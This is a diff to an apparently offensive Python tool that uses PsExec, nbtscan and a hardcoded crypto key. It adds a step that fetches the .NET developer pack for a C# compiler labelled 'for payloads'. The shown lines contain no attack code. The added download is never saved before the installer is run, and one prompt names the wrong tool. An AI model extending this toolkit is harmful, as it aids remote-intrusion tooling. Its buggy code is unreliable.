@@ -51,6 +51,7 @@ regex_ipv4 = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-
 root_path = r"C:\Users\Admin"
 psexec_path = root_path + r"\pstools\psexec.exe"
 nbtscan_path = root_path + r"\nbtscan.exe"
+cs_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 
 # CRYPTO INIT
 key = b'\xb4y\xbd\xa0\xf2,\x1f~\x03\xb3\xef<7\xc4\xca\xde'
@@ -662,7 +663,7 @@ def rmsgT(reason="", target=""):
 
 def getDependencies():
     if not os.path.exists(psexec_path):  # Get PSExec if you don't have it in path
-        print("Do you want to install PSExec? (Required dependency)" "[Y/n]")
+        print("Do you want to install PSExec? (Required dependency) [Y/n]")
         if not input() == "n":
             response = requests.get(r"https://download.sysinternals.com/files/PSTools.zip")
             if response.ok:
@@ -676,7 +677,7 @@ def getDependencies():
             else:
                 print("Failed to get PSExec dependency")
     if not os.path.exists(nbtscan_path):
-        print("Do you want to install PSExec? (Required dependency)" "[Y/n]")
+        print("Do you want to install PSExec? (Required dependency) [Y/n]")
         if not input() == "n":
             response = requests.get(r"http://www.unixwiz.net/tools/nbtscan-1.0.35.exe")
             if response.ok:
@@ -686,6 +687,16 @@ def getDependencies():
                 file.close()
             else:
                 print("Failed to get nbtscan dependency")
+    if not os.path.exists(cs_path):
+        print("Do you want to install C# Compiler? (For payloads) [Y/n]")
+        if not input() == "n":
+            response = requests.get(r"https://go.microsoft.com/fwlink/?linkid=2088517")
+            if response.ok:
+                print("Getting csc dependency...")
+                os.system(r"ndp48-devpack-enu.exe")
+                print("Follow .NET framework install instructions in external window")
+            else:
+                print("Failed to get csc dependency")
 
 
 x = threading.Thread(target=serverT)
